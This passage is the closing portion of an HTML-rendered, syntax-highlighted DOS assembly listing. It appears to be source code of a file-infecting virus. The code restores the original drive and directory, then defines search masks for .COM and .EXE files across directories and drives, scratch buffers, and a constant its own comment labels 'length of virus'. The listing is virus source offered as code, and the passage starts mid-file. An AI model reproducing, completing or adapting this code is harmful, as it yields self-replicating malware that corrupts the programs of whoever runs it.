        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Reactivate the selected drive at the start of the</span><span class="sc0">
</span><span class="sc1">; program.</span><span class="sc0">

</span><span class="sc5">use_old</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                    </span><span class="sc1">; use old drive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">drive</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Reactivate the selected path at the start of the</span><span class="sc0">
</span><span class="sc1">; program.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                    </span><span class="sc1">; use old dir</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">old_path</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; get old path and backslash</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">search_order</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">pointer</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000</span><span class="sc0">                </span><span class="sc1">; pointer f. search order</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000</span><span class="sc0">                 </span><span class="sc1">; counter f. nth. search</span><span class="sc0">
</span><span class="sc5">disks</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; number of disks</span><span class="sc0">

</span><span class="sc5">maske_com</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.com"</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">            </span><span class="sc1">; search for com files</span><span class="sc0">
</span><span class="sc5">maske_dir</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*"</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                </span><span class="sc1">; search for dir's</span><span class="sc0">
</span><span class="sc5">maske_exe</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"????????exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"????????com"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maske_all</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"???????????"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"????????com"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0e000h</span><span class="sc0">                     </span><span class="sc1">; a safe place</span><span class="sc0">

</span><span class="sc5">buflen</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">230h</span><span class="sc0">                       </span><span class="sc1">; length of virus !!!!!!!</span><span class="sc0">
                                      </span><span class="sc1">;         careful</span><span class="sc0">
                                      </span><span class="sc1">;     if changing !!!!!!!</span><span class="sc0">

</span><span class="sc5">jmpbuf</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc5">buflen</span><span class="sc0">              </span><span class="sc1">; a safe place for jmp</span><span class="sc0">
</span><span class="sc5">path</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc13">"\",0                      ; first path
</span><span class="sc5">drive</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; actual drive</span><span class="sc0">
</span><span class="sc5">back_slash</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"\"
</span><span class="sc5">old_path</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                </span><span class="sc1">; old path</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">   </span><span class="sc5">main</span><span class="sc0">
</span></div></body>
</html>
